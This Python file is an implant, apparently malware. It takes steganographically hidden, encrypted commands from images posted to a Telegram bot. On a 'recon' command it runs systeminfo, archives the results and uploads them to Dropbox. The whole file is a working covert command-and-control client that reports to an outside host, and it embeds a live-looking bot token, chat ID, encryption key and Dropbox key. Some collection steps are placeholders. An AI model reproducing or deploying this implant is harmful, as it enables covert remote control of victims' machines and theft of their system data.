import requests
from PIL import Image
import io
from cryptography.fernet import Fernet
import stepic
import sys
import subprocess
import os
from os import path
import time
import random
import platform
import shutil


key = b'7H0RviHlSUDJ8ug1xf0lm5ZO_JZjWketfjcZ9gzaYZU='
TELKEN = '8210714938:AAHAbovQzWwlr8ZRTGyBvAwCh4QOArFILY4'
CHAID = '5457823680'


def getTo():
    """mengambil foto"""
    try:
        url = f"https://api.telegram.org/bot{TELKEN}/getUpdates"
        response = requests.get(url, timeout=30)
        
        if response.status_code == 200:
            data = response.json()
            
            if data['ok'] and data['result']:
                for update in reversed(data['result']):
                    if 'message' in update and 'photo' in update['message']:
                        photo = update['message']['photo'][-1]
                        file_id = photo['file_id']
                        
                        file_url = f"https://api.telegram.org/bot{TELKEN}/getFile"
                        file_response = requests.get(file_url, params={'file_id': file_id})
                        
                        if file_response.status_code == 200:
                            file_data = file_response.json()
                            if file_data['ok']:
                                file_path = file_data['result']['file_path']
                                return f"https://api.telegram.org/file/bot{TELKEN}/{file_path}"
        
        return None
        
    except Exception as e:
        print(f"[-] Tel error: {e}")
        return None

def decodeFromPhoto(URL):
    try:
        response = requests.get(URL, timeout=30)
        if response.status_code == 200:
            image = Image.open(io.BytesIO(response.content))
            return stepic.decode(image)
    except Exception as e:
        print(f"[-] Decode error: {e}")
        return None

def decrypt(enctext, key):
    
    enctext = enctext.encode()
    f = Fernet(key)
    plaintext = f.decrypt(enctext)
    return plaintext.decode()

def sendTelResponse(message):
    
    try:
        url = f"https://api.telegram.org/bot{TELKEN}/sendMessage"
        data = {'chat_id': CHAID, 'text': message}
        response = requests.post(url, json=data, timeout=30)
        return response.status_code == 200
    except:
        return False

def rec(APIKEY):
    
    dumppath = path.expandvars(r'%LOCALAPPDATA%\Telkom')
    if not os.path.exists(dumppath):
        os.mkdir(dumppath)
    
    f = Fernet(key)
    
    command = 'systeminfo'
    output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    result = output.stdout.read()
    error = output.stderr.read()
    encrypted_result = f.encrypt(result)
    encrypted_error = f.encrypt(error)
    
    sysdumpfile = os.path.join(dumppath, 'systeminfo.telkom')
    with open(sysdumpfile, 'wb') as outfile:
        outfile.write(encrypted_result + encrypted_error)
    
    
    try:
        from PIL import Image, ImageDraw
        img = Image.new('RGB', (800, 600), color='gray')
        draw = ImageDraw.Draw(img)
        draw.text((10, 10), f"Screenshot from {platform.node()}", fill='white')
        
        img_byte_arr = io.BytesIO()
        img.save(img_byte_arr, format='PNG')
        sshot_data = img_byte_arr.getvalue()
        
        encrypted_data = f.encrypt(sshot_data)
        sctdumpfile = os.path.join(dumppath, 'screenshot.telkom')
        with open(sctdumpfile, 'wb') as outfile:
            outfile.write(encrypted_data)
    except Exception as e:
        print(f"[-] Screenshot error: {e}")
    
    
    lists = f"File search placeholder\nSystem: {platform.system()}\n"
    encrypted_lists = f.encrypt(lists.encode())
    jusiyfile = os.path.join(dumppath, 'jusiyfile.telkom')
    with open(jusiyfile, 'wb') as outfile:
        outfile.write(encrypted_lists)
    
   
    delivery_name = f'DeliverableIntel_{platform.node()}_{int(time.time())}'
    deliverypath = os.path.join(os.getcwd(), delivery_name)
    shutil.make_archive(deliverypath, 'zip', dumppath)
    

    deliveryfile = deliverypath + ".zip"
    if APIKEY and APIKEY != "sl.u.AGMWwxZKhzCoKd1dsGObPhWG-pPPOQKSbJ19K-zksw2f_EzYbbnBb7ATHAnaGvQBqbn9WwYGKssJ20UFOryQaqUXR2uzntXdKsSP":
        try:
            import dropbox
            drop = dropbox.Dropbox(APIKEY)
            targetfile = f"/Telkom/{os.path.basename(deliveryfile)}"
            with open(deliveryfile, "rb") as f:
                drop.files_upload(f.read(), targetfile, mode=dropbox.files.WriteMode("overwrite"))
            print(f"[+] Uploaded to Dropbox: {targetfile}")
        except Exception as e:
            print(f"[-] Dropbox upload error: {e}")
    
    # Cleanup
    shutil.rmtree(dumppath, ignore_errors=True)
    if os.path.exists(deliveryfile):
        os.remove(deliveryfile)
    
    return "rec completed"


def main():
    """Main implant function"""
    print(f"[*] Implant started on {platform.node()}")
    
    # Test Tel connection
    test_url = f"https://api.telegram.org/bot{TELKEN}/getMe"
    try:
        response = requests.get(test_url, timeout=10)
        if response.status_code == 200:
            print("[+] Tel connection successful")
        else:
            print("[-] Tel connection failed")
            return
    except:
        print("[-] Cannot connect to Tel")
        return
    
    
    sendTelResponse(f"plant started on {platform.node()}")
    
   
    while True:
        try:
            photo_url = getTo()
            
            if photo_url:
                enctext = decodeFromPhoto(photo_url)
                
                if enctext:
                    command = decrypt(enctext, key)
                    
                    if len(command) > 10:
                        parts = command.split(" ", 1)
                        if len(parts) > 1:
                            cmd, api = parts[0], parts[1]
                        else:
                            cmd, api = command, None
                    else:
                        cmd, api = command, None
                    
                    if cmd == 'kill':
                        sendTelResponse("plant terminating")
                        sys.exit(0)
                    elif cmd == 'recon':
                        result = rec(api if api else "NO_API_KEY")
                        sendTelResponse(f"Rec: {result}")
                    else:
                        sendTelResponse(f"Unknown command: {cmd}")
            
            time.sleep(30)
            
        except KeyboardInterrupt:
            print("\n[!] Interrupted")
            sendTelResponse("Implant stopped by user")
            break
        except Exception as e:
            print(f"[-] Error: {e}")
            time.sleep(60)

if __name__ == "__main__":
    main()